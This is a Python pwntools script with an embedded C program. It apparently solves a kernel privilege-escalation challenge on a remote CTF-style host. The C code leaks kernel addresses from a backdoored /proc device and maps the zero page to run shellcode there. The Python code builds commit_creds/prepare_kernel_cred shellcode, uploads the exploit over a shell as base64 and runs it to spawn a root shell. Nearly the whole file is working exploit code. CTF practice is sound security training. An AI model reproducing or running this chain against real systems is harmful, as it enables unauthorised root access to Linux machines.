import re, subprocess, os, time
from pwn import *

context.log_level = 'DEBUG'
"""
references and credits
- https://github.com/pk-man/objdump-shellcode-parser/blob/master/README.md
- https://arttnba3.cn/2021/03/03/NOTE-0X03-LINUX-KERNEL-PWN-PART-II/
- https://www.lazenca.net/pages/viewpage.action?pageId=25624632

// gcc -static exploit.c -o exploit
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>

void get_leak(){
	int fd;
	char *get_value;
	unsigned long leak[300];
	unsigned long address;
	unsigned long commit;
	unsigned long prep_kern;

	fd = open("/proc/bdoor", O_RDWR);
	if (fd < 0){
		printf("cant open device\n");
	}
	else{
		printf("device opened\n");
		get_value = read(fd, leak, sizeof(leak));
		for(int i = 0; i < 10; i++){
			printf("leak 0x%lx \n", leak[i]);
		}
		address = leak[0] - 0xa4062L;
		commit = address + 0x87d90L;
		prep_kern = address + 0x87fc0L;
		printf("[+] Raw leak: 0x%lx\n", leak[0]);
		printf("[+] commit_creds: 0x%lx\n", commit);
		printf("[+] prepare_kernel_cred: 0x%lx\n", prep_kern);

		close(fd);
	}
}

void exploit(){
    char payload[16];
    printf("shellcode: ");
    scanf("%s", payload);
    char *addr = mmap(0, 4096,PROT_READ|PROT_WRITE|PROT_EXEC, MAP_FIXED|MAP_PRIVATE|MAP_ANONYMOUS,-1, 0);
    if(addr != 0){
        printf("[*]Unable to map zero page.\n");
        exit(-1);
    }
  
    printf("[*] Mapped zero page.\n");
    memcpy(0, &payload, sizeof(payload));
  
    int fd = open("/proc/bdoor", O_WRONLY);
    if(0 < fd){
        write(fd, "rightthisway\n", 16);
        system("sh");
    }else{
        printf("Failed to open file.\n");
    }

}

int main(int argc, char *argv[]){
    char *argone = argv[1]; // choose
    int result;
    if(strcmp(argone, "leak") == 0){
        get_leak();
    }

    else if(strcmp(argone, "exp") == 0){
	exploit();
	
    }

    else{
	printf("./exploit leak\n./exploit exp shellcode_here\n");
    }

	

}

"""
def gen_shellcode(cc, pkc):
	pre_shell = f'''xor rdi, rdi \ncall {str(pkc)} \nxchg rdi, rax \ncall {str(cc)} \nret\n''' # with nasm
	with open("shellcode.asm", "w") as f:
		f.write(pre_shell)
		f.close()
	a = subprocess.getoutput("nasm -f elf64 shellcode.asm")
	stdout = subprocess.check_output(['/usr/bin/objdump', '-d', 'shellcode.o'])
	bytes = []
	for x in stdout.split():
		parsed_bytes = ''.join(re.findall('^[0-9a-f][0-9a-f]$', x.decode("utf-8")))
		if parsed_bytes is not b'':
			bytes.append(parsed_bytes)

	shellcode = ''
	shellcode_size = len(bytes)
	for byte in bytes:
		if len(byte) != 0:
			shellcode += r'\x' + byte

	return shellcode


def transfer_and_run():
	p = remote("warzone.hackrocks.com", 7780)
	os.system("tar -czvf exp.tar.gz ./exploit")
	os.system("base64 exp.tar.gz > b64_exp")
	f = open("./b64_exp", "r")
	p.sendline()
	p.recvuntil(b"~ $")
	p.sendline(b"echo '' > b64_exp;")

	# sending the payload with echo
	count = 1
	while True:
		print('echoing payload at line: ' + str(count))
		line = f.readline().replace("\n","")
		if len(line)<=0:
			break
		cmd = b"echo '" + line.encode() + b"' >> b64_exp;"
		p.sendline(cmd) # send lines
		time.sleep(0.01)
		p.recvuntil(b"~ $")
		count += 1
	f.close()
	log.success("Exploit transfer complete")
	p.sendline(b"base64 -d b64_exp > exp.tar.gz; tar -xzvf exp.tar.gz")
	p.recvuntil(b'~ $')

	p.sendline(b'echo a')
	p.recvuntil(b'~ $')

	p.sendline(b'echo a')
	p.recvuntil(b'~ $')

	iter = 0
	cc = ''
	pkc = ''
	raw_leak = ''
	while iter < 3:
		try:
			p.sendline(b'./exploit leak')
			get_leak = p.recvuntil(b"~ $").decode('utf-8')
			#print(get_leak.split('\r\n'))
			for x in get_leak.split('\r\n'):
				if 'commit' in x:
					cc += x
					iter += 1
				elif 'prepare' in x:
					pkc += x
					iter += 1
				elif 'Raw leak' in x:
					raw_leak += x
					iter += 1
		except:
			pass

	#print(pkc) # debug
	#print(cc) # debug
	cc = cc.split(' ')[2]
	pkc = pkc.split(' ')[2]
	raw_leak = raw_leak.split(' ')[3] # [+] Raw leak: 0xffffffff810a4062
	kbase = int(raw_leak, 16) - 0xa4062
	shellcode = gen_shellcode(hex(int(cc, 16) - 0xb), hex(int(pkc, 16) - 0x4))
	log.success("Raw kernel address leak: " + raw_leak)
	log.success("Kernel base address: " + hex(kbase))
	log.success("Commit creds: " + cc)
	log.success("Prepare kernel cred: " + pkc)
	log.success("Shellcode generated: " + shellcode)
	payload = f'''echo -ne "{shellcode}" > load; chmod 777 load; ./load; (cat load ; cat) | ./exploit exp'''
	payload = payload.encode()
	p.sendline(b'echo a')
	p.recvuntil(b'~ $')
	p.sendline(payload)
	p.recv()
	p.sendline(b'a')
	p.recvuntil(b'[*] Mapped zero page.\r\n')
	log.success("Shellcode executed !")
	log.success("[+] let's hope root shell is spawned!")
	p.interactive()


if __name__ == '__main__':
	transfer_and_run()
